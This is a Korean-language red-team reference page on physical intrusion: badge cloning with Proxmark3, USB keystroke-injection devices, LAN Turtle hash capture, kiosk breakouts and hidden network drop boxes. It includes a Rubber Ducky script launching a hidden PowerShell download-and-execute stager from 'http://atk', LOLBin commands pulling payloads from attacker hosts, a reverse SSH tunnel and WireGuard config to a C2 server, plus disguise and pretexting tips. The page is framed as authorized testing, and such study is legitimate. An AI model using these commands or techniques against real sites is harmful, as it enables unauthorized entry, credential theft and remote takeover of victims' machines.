# 물리 침투 / KIOSK / Hardware

레드팀 scope 에 물리 침투가 들어가는 경우가 꽤 있다. 1층 로비, 안내 데스크 PC, KIOSK 단말, 주차장 AP, USB drop 같은 거.

---

## 일반적인 플로우

```mermaid
flowchart LR
    A[외부 정찰\n건물/출입통제] --> B[Pretext\n배달원/외주/청소]
    B --> C[Tailgating\n출입증 복제]
    C --> D[내부 network drop]
    D --> E[Implant 장비\nLAN Turtle/RPi]
    E --> F[원격 C2]
```

---

## Tailgating / 출입증 복제

### HID / RFID 복제

```bash
# Proxmark3 (125kHz / 13.56MHz 둘 다)
pm3> hf search                          # 카드 종류 자동 탐지
pm3> lf hid read                        # HID Prox 카드 읽기
pm3> lf hid sim -r 2006ec0c86           # 읽은 값으로 emulate
pm3> lf hid clone -r 2006ec0c86         # 공카드에 복제

# MIFARE Classic (13.56MHz)
pm3> hf mf autopwn                      # 기본 키 자동 dump
```

- **ESPKey**: 출입통제기 Wiegand 라인 (D0 / D1) 에 인라인으로 끼워 두면 지나가는 모든 카드 값이 수집된다.
- **Long-range HID reader**: 가방 안에 숨겨서 1~2m 거리에서 피해자 배지 복제.

---

## USB / HID Injection

| 장비 | 특징 |
|---|---|
| Rubber Ducky | HID keyboard 로 인식 → 사전 정의한 키 입력 자동 실행 |
| Bash Bunny | Ducky + storage + network adapter. credential 탈취 자동화 |
| O.MG Cable | 충전 케이블 위장. WiFi 로 원격 payload 주입 |
| Evil Crow Cable | O.MG 오픈소스 버전 |
| LAN Turtle | USB-Ethernet 어댑터 위장. NAC 환경에서 QuickCreds 공격 |

```
// Rubber Ducky 스크립트 예시 — PowerShell stager 실행
DELAY 2000
GUI r
DELAY 500
STRING powershell -nop -w hidden -c "iex(iwr http://atk/a.ps1 -UseBasicParsing)"
ENTER
```

---

## LAN Turtle / Packet Squirrel / Responder 자동화

```bash
# QuickCreds (LAN Turtle)
# 1. 잠금 상태 PC 에 LAN Turtle 꽂음
# 2. Windows 가 "새 Ethernet adapter" 인식
# 3. DHCP 로 gateway 변조
# 4. Responder 로 NetNTLMv2 hash 수집
# 5. 2~3분 후 뽑고 나감
```

!!! warning "OPSEC"
    잠금 상태 Windows 도 새 NIC 에 대해 자동으로 DNS / WPAD 쿼리를 날린다. 즉 로그인 안 된 PC 에서도 NetNTLMv2 를 빼올 수 있다. EDR 에는 거의 안 찍히지만 Windows Event 6416 (new device enumeration) 에는 남는다.

---

## KIOSK / 로비 단말 탈출

- **Sticky Keys (Shift 5번)**: `C:\Windows\System32\sethc.exe` 를 `cmd.exe` 로 교체. BitLocker 없는 경우 부팅 USB 로 가능
- **Open / Save dialog**: `cmd.exe`, `powershell.exe` 경로 직접 입력 → shell
- **Help / Print / Properties 우회**:
  - IE 기반 KIOSK: F1 → help → Jump to URL → `file:///C:/windows/system32/cmd.exe`
  - Explorer 주소창에 `powershell.exe` 직접 타이핑
- **Adobe Reader**: 문서 내 `javascript:` URI, `app.launchURL()` 악용
- **Citrix / Published App**: `Ctrl+P` → 프린터 설정 → 파일 추가 → `cmd.exe`

```powershell
# AppLocker / UAC 걸려 있어도 먹히는 LOLBins
rundll32.exe url.dll,FileProtocolHandler \\attacker\share\payload.exe
regsvr32.exe /s /n /u /i:http://atk/payload.sct scrobj.dll
msiexec /q /i http://atk/payload.msi
```

---

## WiFi / 주차장 연계

1. 주차장에서 guest / 회사 AP 스캔 → [Wireless](wireless.md)
2. 내부 AP 붙자마자 responder / mitm6
3. 이 시점부터 Assumed Breach 와 동일한 "내부망 진입" 상태

---

## Drop Box (원격 implant)

```bash
# Raspberry Pi 4 + LTE 모뎀
# 1. reverse SSH tunnel
autossh -f -N -R 2222:localhost:22 redteam@c2.example.com

# 2. Wireguard (안정적)
# /etc/wireguard/wg0.conf
[Interface]
PrivateKey = ...
[Peer]
PublicKey = ...
Endpoint = c2.example.com:51820
AllowedIPs = 10.0.0.0/8, 172.16.0.0/12, 192.168.0.0/16
PersistentKeepalive = 25

# 3. 이후 내부망 정찰은 C2 쪽에서 tunnel 로 다 진행
```

- 발각 대비: 외관은 평범한 HDMI capture 장비 / 회의실 콘솔 / 전원 스트립 으로 위장.
- 전원 뽑혀도 자동 재접속: `autossh` + `systemd Restart=always`.

---

## OPSEC checklist

- [ ] 복장은 타겟 회사 외주 / 업체 작업복 (배달, 청소, 통신사 기사)
- [ ] 복제한 배지에는 회사 로고 / 이름 인쇄. 멀리서 봤을 때 어색하지 않게
- [ ] Drop box 의 MAC 은 해당 회사가 쓰는 장비 OUI 로 위조
- [ ] 철수 경로 미리 정찰. 모든 장비에 식별표 (레드팀 라벨) 부착 → 발각 시 바로 증명

---

## 참고

- [Wireless](wireless.md)
- [Enumeration](../lifecycle/enumeration.md)
- [C2 Infrastructure](../infra/c2.md)
